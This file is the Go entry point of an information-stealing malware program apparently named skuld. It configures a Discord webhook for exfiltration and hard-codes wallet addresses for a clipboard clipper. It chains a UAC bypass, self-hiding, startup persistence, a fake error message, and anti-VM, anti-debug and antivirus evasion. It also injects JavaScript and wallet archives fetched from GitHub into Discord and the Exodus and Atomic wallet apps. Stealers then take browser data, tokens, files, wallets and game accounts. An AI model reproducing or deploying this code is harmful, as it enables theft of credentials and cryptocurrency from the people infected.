package main

import (
	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "https://discord.com/api/webhooks/1568311693401129057/B0xmVhoD9THH9gfyu9wvjPxcW1N3mxndEX9UH7qfc7EOgZnUROAnNIkIOVpA8jxKxUrV",
		"cryptos": map[string]string{
			"BTC": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"BCH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"ETH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"XMR": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"LTC": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"XCH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"XLM": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"TRX": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"ADA": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"DASH": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
			"DOGE": "0x8908c54D457D58De870035baf8DC3D3F9866967B",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
